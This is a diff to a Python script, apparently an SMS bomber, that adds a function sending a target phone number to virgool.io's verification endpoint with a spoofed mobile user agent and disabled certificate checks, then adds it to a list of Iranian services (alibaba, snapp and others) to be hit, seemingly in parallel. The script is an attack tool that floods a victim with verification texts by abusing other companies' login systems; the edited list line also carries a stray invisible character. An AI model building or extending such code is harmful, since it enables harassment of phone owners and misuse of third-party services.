@@ -65,6 +65,45 @@ def send_service_safe(service, phone):
 # ==========================
 
 
+def virgool(phone):
+    try:
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
+        
+        headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+            "Accept": "application/json",
+            "Content-Type": "application/json"
+        }
+        
+        payload = {
+            "method": "phone",
+            "identifier": formatted_phone
+        }
+        
+        response = requests.post(
+            "https://virgool.io/api/v1.4/auth/verify",
+            json=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[Debug] virgool Status: {response.status_code}{a}')
+        print(f'{y}[Debug] virgool Response: {response.text}{a}')
+        
+        if response.status_code in [200, 201]:
+            print(f'{g}(virgool) sms sent successfully!{a}')
+            return True
+        else:
+            print(f'{r}[-] virgool error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] virgool exception: {e}{a}')
+        return False
+
+
 
 def otaghak(phone):
     try:
@@ -265,7 +304,7 @@ def snapp(phone):
 # ==========================
 # لیست سرویس‌ها
 # ==========================
-services = [alibaba, mek, trip, otaghak, snapp]
+services = [alibaba, mek, trip, otaghak, snapp‏, virgool]
 
 # ==========================
 # تابع VIP مولتی‌تردینگ
